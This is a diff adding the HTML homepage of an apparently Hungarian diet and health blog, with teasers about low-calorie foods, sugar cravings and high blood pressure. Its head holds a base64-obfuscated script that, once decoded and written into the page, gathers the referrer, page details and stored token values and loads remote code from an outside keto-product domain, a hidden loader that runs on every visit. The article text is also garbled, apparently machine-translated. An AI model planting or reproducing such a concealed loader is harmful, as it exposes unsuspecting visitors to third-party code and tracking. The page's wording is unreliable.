@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+  <script>let encoded = 'PHNjcmlwdD4KICAgIChmdW5jdGlvbigpIHsKICAgIHZhciBuYW1lID0gJ196bnFHWDVYZng0a3N2OGJmJzsKICAgIGlmICghd2luZG93Ll96bnFHWDVYZng0a3N2OGJmKSB7CiAgICAgICAgd2luZG93Ll96bnFHWDVYZng0a3N2OGJmID0gewogICAgICAgICAgICB1bmlxdWU6IGZhbHNlLAogICAgICAgICAgICB0dGw6IDg2NDAwLAogICAgICAgICAgICBSX1BBVEg6ICdodHRwczovL2tldG9iaW9saXZlbmV3LndlYnNpdGUvcHNNeXhOJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX1h3RlN2Y3JaeGQ4RHpmaFQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9Yd0ZTdmNyWnhkOER6ZmhUICE9PSAndW5kZWZpbmVkJyAmJiBfWHdGU3Zjclp4ZDhEemZoVCAhPT0gbnVsbCkgewogICAgICAgIHZhciBfdmI0NkZDUHJqYkRMN0RwYiA9IEpTT04ucGFyc2UoX1h3RlN2Y3JaeGQ4RHpmaFQpOwogICAgICAgIHZhciBfYzVYOVdnSmJYVkx5NENNMiA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF92YjQ2RkNQcmpiREw3RHBiLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX3pucUdYNVhmeDRrc3Y4YmYudHRsIDwgX2M1WDlXZ0piWFZMeTRDTTIpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF83UDVXSHF3MkhkMjNMOFNUID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX2NmM1JGS2dZRFJKQ1lqSHMgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfN0NXcDhoRkx4U2ZEekNLWCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgXzdDV3A4aEZMeFNmRHpDS1ggKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgXzdDV3A4aEZMeFNmRHpDS1ggKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfN0NXcDhoRkx4U2ZEekNLWCArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfN0NXcDhoRkx4U2ZEekNLWCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgXzdDV3A4aEZMeFNmRHpDS1ggKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgXzdDV3A4aEZMeFNmRHpDS1ggKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll96bnFHWDVYZng0a3N2OGJmLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF83UDVXSHF3MkhkMjNMOFNUICE9PSAndW5kZWZpbmVkJyAmJiBfN1A1V0hxdzJIZDIzTDhTVCAmJiB3aW5kb3cuX3pucUdYNVhmeDRrc3Y4YmYudW5pcXVlKSB7CiAgICAgICAgXzdDV3A4aEZMeFNmRHpDS1ggKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfN1A1V0hxdzJIZDIzTDhTVCk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9jZjNSRktnWURSSkNZakhzICE9PSAndW5kZWZpbmVkJyAmJiBfY2YzUkZLZ1lEUkpDWWpIcyAmJiB3aW5kb3cuX3pucUdYNVhmeDRrc3Y4YmYudW5pcXVlKSB7CiAgICAgICAgXzdDV3A4aEZMeFNmRHpDS1ggKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9jZjNSRktnWURSSkNZakhzKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll96bnFHWDVYZng0a3N2OGJmLlJfUEFUSCArIF83Q1dwOGhGTHhTZkR6Q0tYOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAgPC9zY3JpcHQ+';let decoded = atob(encoded);document.write(''+ decoded +'');</script>
+
+
+  <title>Isten áldjon meg</title>
+
+  <meta charset="utf-8">
+  <!--[if IE]><meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'><![endif]-->
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+
+
+  <!-- Google Fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,600,700' rel='stylesheet'>
+
+  <!-- Css -->
+  <link rel="stylesheet" href="css/bootstrap.min.css" />
+  <link rel="stylesheet" href="css/font-icons.css" />
+  <link rel="stylesheet" href="css/style.css" />
+
+  <!-- Favicons -->
+
+
+
+  <!-- Lazyload -->
+  <script src="js/lazysizes.min.js"></script>
+
+</head>
+
+<body class="bg-light">
+
+  <!-- Preloader -->
+
+
+  <!-- Bg Overlay -->
+
+
+  <!-- Sidenav -->    
+ <!-- end sidenav -->
+
+  <main class="main oh" id="main">
+
+    <!-- Navigation -->
+    <header class="nav">
+
+      <div class="nav__holder nav--sticky">
+        <div class="container relative">
+          <div class="flex-parent">
+
+            <!-- Side Menu Button -->
+         <!-- end Side menu button -->
+
+            <!-- Mobile logo -->
+            <a href="index.html" class="logo logo--mobile d-lg-none">
+             esztétika
+            </a>
+
+            <!-- Nav-wrap -->
+            <nav class="flex-child nav__wrap d-none d-lg-block">              
+              <ul class="nav__menu">
+
+                <li class="active">
+                  <a href="index.html">Fő</a>
+                </li>
+
+                <li class="nav__dropdown">
+                  <a href="blog.html">Cikkek</a>
+                </li>
+
+                <li class="nav__dropdown">
+                  <a href="contact.html">Kapcsolatok</a>
+                </li>
+
+                <li class="nav__dropdown">
+                  <a href="policy.html">Adatvédelmi politika</a>
+                </li>
+
+                <li>
+                  <a href="terms.html">Általános szerződési feltételek</a>
+                </li>
+
+
+              </ul> <!-- end menu -->
+            </nav> <!-- end nav-wrap -->
+
+            <!-- Nav Right -->
+            <div class="nav__right nav--align-right d-lg-flex">
+
+              <!-- Socials -->
+              <div class="nav__right-item socials nav__socials d-none d-lg-flex"> 
+                <a class="social social-facebook social--nobase" href="#" target="_blank" aria-label="facebook">
+                  <i class="ui-facebook"></i>
+                </a>
+                <a class="social social-twitter social--nobase" href="#" target="_blank" aria-label="twitter">
+                  <i class="ui-twitter"></i>
+                </a>
+                <a class="social social-google social--nobase" href="#" target="_blank" aria-label="google">
+                  <i class="ui-google"></i>
+                </a>
+                <a class="social social-youtube social--nobase" href="#" target="_blank" aria-label="youtube">
+                  <i class="ui-youtube"></i>
+                </a>
+                <a class="social social-instagram social--nobase" href="#" target="_blank" aria-label="instagram">
+                  <i class="ui-instagram"></i>
+                </a>
+              </div>
+
+              <!-- Search -->
+              <div class="nav__right-item nav__search">
+                <a href="#" class="nav__search-trigger" id="nav__search-trigger">
+                  <i class="ui-search nav__search-trigger-icon"></i>
+                </a>
+                <div class="nav__search-box" id="nav__search-box">
+                  <form class="nav__search-form">
+                    <input type="text" placeholder="Search an article" class="nav__search-input">
+                    <button type="submit" class="search-button btn btn-lg btn-color btn-button">
+                      <i class="ui-search nav__search-icon"></i>
+                    </button>
+                  </form>
+                </div>
+                
+              </div>
+
+            </div> <!-- end nav right -->  
+        
+          </div> <!-- end flex-parent -->
+        </div> <!-- end container -->
+
+      </div>
+    </header> <!-- end navigation -->
+  
+    <!-- Header -->
+ <!-- end header -->
+
+    <!-- Trending Now -->
+
+
+    <!-- Featured Posts Grid -->      
+    <section class="featured-posts-grid bg-dark">
+      <div class="container clearfix">
+        
+        <!-- Large post slider -->
+        <div class="featured-posts-grid__item featured-posts-grid__item--lg">
+          <div id="owl-hero-grid" class="owl-carousel owl-theme owl-carousel--dots-inside">
+            
+            <article class="entry featured-posts-grid__entry">
+              <div class="thumb-bg-holder owl-lazy" data-src="./assets/images/jared-rice-ntybbu66_si-unsplash.jpg">
+                <img src="./assets/images/jared-rice-ntybbu66_si-unsplash.jpg"  class="d-none">
+                <a href="amelyek.html" class="thumb-url"></a>
+                <div class="bottom-gradient"></div>
+              </div>
+
+              <div class="thumb-text-holder">
+                <h2 class="thumb-entry-title">
+                  <a href="amelyek.html">6 az élelmiszerek, amelyek csak 10 kalóriát egy üveg</a>
+                </h2>
+              </div>
+            </article>
+            
+
+          </div> <!-- end owl slider -->
+        </div> <!-- end large post slider -->
+        
+
+        <div class="featured-posts-grid__item featured-posts-grid__item--sm">
+          
+          <article class="entry featured-posts-grid__entry">
+            <div class="thumb-bg-holder" style="background-image: url(./assets/images/simon-rae-igobsr93i7y-unsplash.jpg) ">
+              <a href="hogyan.html" class="thumb-url"></a>
+              <div class="bottom-gradient"></div>
+            </div>
+
+            <div class="thumb-text-holder">  
+              <h2 class="thumb-entry-title thumb-entry-title--sm">
+                <a href="hogyan.html">Hogyan lehet megszabadulni a sóvárgást, édességek</a>
+              </h2>
+              <ul class="entry__meta">
+                <li class="entry__meta-author">
+                  <i class="ui-author"></i>
+                  Ramóna
+                </li>
+                <li class="entry__meta-date">
+                  <i class="ui-date"></i>
+                  28.03.2021
+                </li>
+                <li class="entry__meta-comments">
+                  <i class="ui-comments"></i>
+                39
+                </li>               
+              </ul>
+            </div>
+          </article>
+          
+
+          <article class="entry featured-posts-grid__entry">
+            <div class="thumb-bg-holder" style="background-image: url(./assets/images/hyper.jpg) ">
+              <a href="hyper.html" class="thumb-url"></a>
+              <div class="bottom-gradient"></div>
+            </div>
+
+            <div class="thumb-text-holder">  
+              <h2 class="thumb-entry-title thumb-entry-title--sm">
+                <a href="hyper.html">Miért fontos figyelnünk a magas vérnyomásra?</a>
+              </h2>
+              <ul class="entry__meta">
+                <li class="entry__meta-author">
+                  <i class="ui-author"></i>
+                  Ramóna
+                </li>
+                <li class="entry__meta-date">
+                  <i class="ui-date"></i>
+                  28.03.2021
+                </li>
+                <li class="entry__meta-comments">
+                  <i class="ui-comments"></i>
+                39
+                </li>               
+              </ul>
+            </div>
+          </article>
+          
+
+        </div>
+
+
+
+      </div>
+    </section> <!-- end featured posts grid -->
+
+    <div class="main-container container mt-40" id="main-container">         
+
+      <!-- Content -->
+      <div class="row">
+
+        <!-- Posts -->
+        <div class="col-lg-8 blog__content mb-30">
+          
+          <!-- Hot News -->
+
+
+          <!-- Latest News -->
+          <section class="section">
+
+            
+
+            <article class="entry post-list">
+              <div class="entry__img-holder post-list__img-holder">
+                <a href="amelyek.html">
+                  <div class="thumb-container thumb-75">
+                    <img data-src="./assets/images/jared-rice-ntybbu66_si-unsplash.jpg" src="amelyek.html" class="entry__img lazyload" >
+                  </div>
+                </a>
+              </div>
+
+              <div class="entry__body post-list__body">
+                <div class="entry__header">
+
+                  <h2 class="entry__title">
+                    <a href="amelyek.html">6 az élelmiszerek, amelyek csak 10 kalóriát egy üveg</a>
+                  </h2>
+                  <ul class="entry__meta">
+                    <li class="entry__meta-author">
+                      <i class="ui-author"></i>
+                      Ramóna
+                    </li>
+                    <li class="entry__meta-date">
+                      <i class="ui-date"></i>
+                      28.03.2021
+                    </li>
+                    <li class="entry__meta-comments">
+                      <i class="ui-comments"></i>
+                     39
+                    </li>
+                  </ul>
+                </div>
+                <div class="entry__excerpt">
+                  <p> <strong></strong> Ez a legnépszerűbb finom Japán étel, de tartalmaz, mindössze 20 kalória van a pohár. Ez annak köszönhető, hogy az a tény......</p>
+                </div>
+              </div>
+            </article>
+
+            
+
+
+            <article class="entry post-list">
+              <div class="entry__img-holder post-list__img-holder">
+                <a href="hyper.html">
+                  <div class="thumb-container thumb-75">
+                    <img data-src="./assets/images/hyper.jpg" src="hyper.html" class="entry__img lazyload" >
+                  </div>
+                </a>
+              </div>
+
+              <div class="entry__body post-list__body">
+                <div class="entry__header">
+
+                  <h2 class="entry__title">
+                    <a href="hyper.html">Miért fontos figyelnünk a magas vérnyomásra?</a>
+                  </h2>
+                  <ul class="entry__meta">
+                    <li class="entry__meta-author">
+                      <i class="ui-author"></i>
+                      Ramóna
+                    </li>
+                    <li class="entry__meta-date">
+                      <i class="ui-date"></i>
+                      28.03.2021
+                    </li>
+                    <li class="entry__meta-comments">
+                      <i class="ui-comments"></i>
+                     39
+                    </li>
+                  </ul>
+                </div>
+                <div class="entry__excerpt">
+                  <p> <strong></strong> A felnőtt lakosság több mint egynegyedét érintő magas vérnyomás napjainkban népbetegségnek számít, mely sokáig nem produkál észlelhető tüneteket.......</p>
+                </div>
+              </div>
+            </article>
+
+            
+
+
+            <article class="entry post-list">
+              <div class="entry__img-holder post-list__img-holder">
+                <a href="hogyan.html">
+                  <div class="thumb-container thumb-75">
+                    <img data-src="./assets/images/simon-rae-igobsr93i7y-unsplash.jpg" src="hogyan.html" class="entry__img lazyload" >
+                  </div>
+                </a>
+              </div>
+
+              <div class="entry__body post-list__body">
+                <div class="entry__header">
+
+                  <h2 class="entry__title">
+                    <a href="hogyan.html">Hogyan lehet megszabadulni a sóvárgást, édességek</a>
+                  </h2>
+                  <ul class="entry__meta">
+                    <li class="entry__meta-author">
+                      <i class="ui-author"></i>
+                      Ramóna
+                    </li>
+                    <li class="entry__meta-date">
+                      <i class="ui-date"></i>
+                      28.03.2021
+                    </li>
+                    <li class="entry__meta-comments">
+                      <i class="ui-comments"></i>
+                     39
+                    </li>
+                  </ul>
+                </div>
+                <div class="entry__excerpt">
+                  <p> <strong></strong> számos módja Van, hogy megszabaduljon a szokása, hogy a túlevés. Az egyik a átruházása, ízlés, érzelmi érzés a kedvenc......</p>
+                </div>
+              </div>
+            </article>
+
+            
+
+
+
+
+          </section> <!-- end latest news -->
+
+          <!-- Ad Banner 728 -->
+
+
+          <!-- Editor's Picks -->
+
+
+          <!-- Posts from categories -->
+
+
+          <!-- Carousel posts -->
+
+
+        </div> <!-- end posts -->
+
+        <!-- Sidebar -->
+        <aside class="col-lg-4 sidebar sidebar--right">
+
+          <!-- Widget Social Subscribers -->
+          <div class="widget widget-social-subscribers">
+            <ul class="widget-social-subscribers__list">
+              <li class="widget-social-subscribers__item">
+                <a href="#" class="widget-social-subscribers__url widget-social-subscribers--facebook">
+                  <i class="ui-facebook widget-social-subscribers__icon"></i>
+                  <span class="widget-social-subscribers__number">492</span>
+
+                </a>
+              </li>
+              <li class="widget-social-subscribers__item">
+                <a href="#" class="widget-social-subscribers__url widget-social-subscribers--twitter">
+                  <i class="ui-twitter widget-social-subscribers__icon"></i>
+                  <span class="widget-social-subscribers__number">880</span>
+
+                </a>
+              </li>
+              <li class="widget-social-subscribers__item">
+                <a href="#" class="widget-social-subscribers__url widget-social-subscribers--google">
+                  <i class="ui-google widget-social-subscribers__icon"></i>
+                  <span class="widget-social-subscribers__number">1211</span>
+
+                </a>
+              </li>
+              <li class="widget-social-subscribers__item">
+                <a href="#" class="widget-social-subscribers__url widget-social-subscribers--rss">
+                  <i class="ui-rss widget-social-subscribers__icon"></i>
+                  <span class="widget-social-subscribers__number">767</span>
+
+                </a>
+              </li>
+              <li class="widget-social-subscribers__item">
+                <a href="#" class="widget-social-subscribers__url widget-social-subscribers--youtube">
+                  <i class="ui-youtube widget-social-subscribers__icon"></i>
+                  <span class="widget-social-subscribers__number">485</span>
+
+                </a>
+              </li>
+              <li class="widget-social-subscribers__item">
+                <a href="#" class="widget-social-subscribers__url widget-social-subscribers--instagram">
+                  <i class="ui-instagram widget-social-subscribers__icon"></i>
+                  <span class="widget-social-subscribers__number">1426</span>
+
+                </a>
+              </li>
+            </ul>
+          </div>
+
+          <!-- Widget Newsletter -->
+          <div class="widget widget_mc4wp_form_widget">
+            <h4 class="widget-title">Feliratkozás</h4>
+            <form class="mc4wp-form" method="post" action="thanks.html">
+              <div class="mc4wp-form-fields">
+                <p>
+                  <input type="email" name="EMAIL" placeholder="E-mail" required="">
+                </p>
+                <p>
+                  <input type="submit" class="btn btn-lg btn-color" value="Küldeni">
+                </p>
+              </div>
+            </form>
+          </div> <!-- end widget newsletter -->
+          
+          <!-- Widget Popular/Latest Posts -->
+          <div class="widget widget-tabpost">
+            <div class="tabs widget-tabpost__tabs">
+              <ul class="tabs__list widget-tabpost__tabs-list">
+                <li class="tabs__item widget-tabpost__tabs-item tabs__item--active">
+                  <a href="-%&link&%-" class="tabs__url tabs__trigger widget-tabpost__tabs-url">Népszerű</a>
+                </li>                                 
+
+              </ul> <!-- end tabs -->
+              
+              <!-- tab content -->
+              <div class="tabs__content tabs__content-trigger widget-tabpost__tabs-content">
+                
+                <div class="tabs__content-pane tabs__content-pane--active" id="tab-trending">
+                  <ul class="post-list-small">
+                    
+                    <li class="post-list-small__item">
+                      <article class="post-list-small__entry clearfix">
+                        <div class="post-list-small__img-holder">
+                          <div class="thumb-container thumb-75">
+                            <a href="amelyek.html">
+                              <img data-src="./assets/images/jared-rice-ntybbu66_si-unsplash.jpg" src="./assets/images/jared-rice-ntybbu66_si-unsplash.jpg" class=" lazyload">
+                            </a>
+                          </div>
+                        </div>
+                        <div class="post-list-small__body">
+                          <h3 class="post-list-small__entry-title">
+                            <a href="amelyek.html">6 az élelmiszerek, amelyek csak 10 kalóriát egy üveg</a>
+                          </h3>
+                          <ul class="entry__meta">
+                            <li class="entry__meta-date">
+                              <i class="ui-date"></i>
+                              28.03.2021
+                            </li>
+                          </ul>
+                        </div>                  
+                      </article>
+                    </li>
+                    
+
+                    <li class="post-list-small__item">
+                      <article class="post-list-small__entry clearfix">
+                        <div class="post-list-small__img-holder">
+                          <div class="thumb-container thumb-75">
+                            <a href="hyper.html">
+                              <img data-src="./assets/images/hyper.jpg" src="./assets/images/hyper.jpg" class=" lazyload">
+                            </a>
+                          </div>
+                        </div>
+                        <div class="post-list-small__body">
+                          <h3 class="post-list-small__entry-title">
+                            <a href="hyper.html">Miért fontos figyelnünk a magas vérnyomásra?</a>
+                          </h3>
+                          <ul class="entry__meta">
+                            <li class="entry__meta-date">
+                              <i class="ui-date"></i>
+                              28.03.2021
+                            </li>
+                          </ul>
+                        </div>                  
+                      </article>
+                    </li>
+                    
+
+                    <li class="post-list-small__item">
+                      <article class="post-list-small__entry clearfix">
+                        <div class="post-list-small__img-holder">
+                          <div class="thumb-container thumb-75">
+                            <a href="hogyan.html">
+                              <img data-src="./assets/images/simon-rae-igobsr93i7y-unsplash.jpg" src="./assets/images/simon-rae-igobsr93i7y-unsplash.jpg" class=" lazyload">
+                            </a>
+                          </div>
+                        </div>
+                        <div class="post-list-small__body">
+                          <h3 class="post-list-small__entry-title">
+                            <a href="hogyan.html">Hogyan lehet megszabadulni a sóvárgást, édességek</a>
+                          </h3>
+                          <ul class="entry__meta">
+                            <li class="entry__meta-date">
+                              <i class="ui-date"></i>
+                              28.03.2021
+                            </li>
+                          </ul>
+                        </div>                  
+                      </article>
+                    </li>
+                    
+
+
+                  </ul>
+                </div>
+                
+
+                
+
+                
+              </div> <!-- end tab content -->
+            </div> <!-- end tabs -->            
+          </div> <!-- end widget popular/latest posts -->
+
+          <!-- Widget Socials -->
+         <!-- end widget socials -->
+
+          <!-- Widget Twitter -->
+
+
+          <!-- Widget Ad 125 -->
+         <!-- end widget ad 300 -->
+
+          <!-- Widget Carousel -->
+
+
+          <!-- Latest Reviews -->
+
+
+          <!-- Widget Tags -->
+
+
+        </aside> <!-- end sidebar -->
+  
+      </div> <!-- end content -->
+    </div> <!-- end main container -->
+
+    <!-- Footer -->
+    <footer class="footer footer--dark">
+      <div class="container">
+        <div class="footer__widgets">
+          <div class="row">
+
+            <div class="col-lg-3 col-md-6">
+              <div class="widget">
+                <a href="index.html">
+                  Isten áldjon meg
+                </a>
+
+              </div>
+            </div>
+
+
+
+            <div class="col-lg-3 col-md-6">
+              <div class="widget widget__newsletter">
+
+
+                <div class="socials mb-20">
+                  <a href="#" class="social social-facebook" aria-label="facebook"><i class="ui-facebook"></i></a>
+                  <a href="#" class="social social-twitter" aria-label="twitter"><i class="ui-twitter"></i></a>
+                  <a href="#" class="social social-google-plus" aria-label="google+"><i class="ui-google"></i></a>
+                  <a href="#" class="social social-youtube" aria-label="youtube"><i class="ui-youtube"></i></a>
+                  <a href="#" class="social social-instagram" aria-label="instagram"><i class="ui-instagram"></i></a>
+                </div>
+
+                <form class="mc4wp-form" method="post" action="thanks.html">
+                  <div class="mc4wp-form-fields">
+                    <p>
+                      <input type="email" name="EMAIL" placeholder="E-mail" required="">
+                    </p>
+                    <p>
+                      <input type="submit" class="btn btn-lg btn-color" value="Küldeni">
+                    </p>
+                  </div>
+                </form>
+                
+              </div>
+            </div>            
+
+            <div class="col-lg-3 col-md-6">
+              <div class="widget widget_nav_menu">
+
+                <ul>
+                  <li >
+                    <a href="index.html">Fő</a>
+                  </li>
+
+                  <li >
+                    <a href="blog.html">Cikkek</a>
+                  </li>
+
+                  <li >
+                    <a href="contact.html">Kapcsolatok</a>
+                  </li>
+
+                  <li>
+                    <a href="policy.html">Adatvédelmi politika</a>
+                  </li>
+                </ul>
+              </div>
+            </div>            
+
+          </div>
+        </div>    
+      </div> <!-- end container -->
+
+      <div class="footer__bottom">
+        <div class="container">
+          <div class="row">
+
+            <div class="col-lg-5 order-lg-1 text-md-center">
+              <span class="copyright">
+                Copyright &copy;<script>document.write(new Date().getFullYear());</script>
+              All rights reserved
+              </span>
+            </div>            
+          </div>
+          
+        </div>
+      </div> <!-- end bottom footer -->
+    </footer> <!-- end footer -->
+
+    <div class='cookie-banner'>
+      <p>
+        Az oldal cookie-kat használ. Ezek lehetővé teszik számunkra, hogy ismerje meg információt kap arról, hogy a felhasználó experience.By tovább böngészni az oldalt, egyetértek, hogy a cookie-k használatát, amelyet a webhely tulajdonosa megfelelően  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Cookie-politika</a>
+      </p>
+      <button class='close-cookie'>&times;</button>
+    </div>
+
+  </main> <!-- end main-wrapper -->
+
+  
+  <!-- jQuery Scripts -->
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/easing.min.js"></script>
+  <script src="js/owl-carousel.min.js"></script>
+  <script src="js/twitterFetcher_min.js"></script>
+  <script src="js/jquery.newsTicker.min.js"></script>  
+  <script src="js/modernizr.min.js"></script>
+  <script src="js/scripts.js"></script>
+
+  <script>
+    window.onload = function () {
+      $('.close-cookie').click(function () {
+        $('.cookie-banner').fadeOut();
+      })
+    }
+  </script>
+  <script>
+    let elems = document.querySelectorAll('.server-name');
+    elems.forEach((elem) => {
+      elem.innerHTML = window.location.hostname
+    })
+  </script>
+
+</body>
+</html>
